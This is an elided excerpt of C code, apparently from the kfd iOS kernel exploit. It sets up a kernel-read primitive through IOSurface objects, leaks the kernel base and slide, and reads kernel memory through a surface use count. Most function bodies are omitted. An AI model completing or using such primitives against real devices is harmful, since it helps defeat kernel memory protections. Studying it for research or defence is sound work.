...
void kread_IOSurface_init(struct kfd* kfd)
{
    ...
    g_surfaceConnect = kfd_get_surface_client();
}
...
void kread_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    ...
    objectStorage[id].port = kfd_create_surface_fast_path(g_surfaceConnect, &objectStorage[id].surface_id, &args);
}
...
{
    if (kfd_kbase == 0) {
        kfd_kbase = kernel_base;
        print_u64(kernel_base);
    }
...
void kread_IOSurface_find_proc(struct kfd* kfd)
{
    ...
    print_u64(kfd->info.kernel.kernel_slide);
...
void kread_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (id != kfd->kread.krkw_object_id) {
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
        kfd_release_surface(objectStorage[id].port, objectStorage[id].surface_id);
    }
}
...
void kread_IOSurface_free(struct kfd* kfd)
{
    ...
    kfd_release_surface(krwObject.port, krwObject.surface_id);
}
...
u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr)
{
    ...
    u32 read32 = 0;
    kfd_iosurface_get_use_count(krwObject.port, krwObject.surface_id, &read32);
